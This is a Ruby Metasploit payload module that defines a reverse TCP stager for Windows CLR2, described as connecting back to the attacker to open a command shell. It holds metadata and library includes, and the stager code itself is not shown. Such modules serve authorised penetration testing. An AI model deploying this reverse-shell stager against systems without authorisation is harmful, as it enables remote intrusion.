##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/clr2/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 283

  include Msf::Payload::Stager
  include Msf::Payload::Clr2::ReverseTcp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Reverse TCP Stager',
      'Description' => 'Connect back to the attacker (CLR)',
      'Author'      => ['OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'windows',
      'Arch'        => ARCH_CLR2,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Stager'      => {}
    ))
  end
end
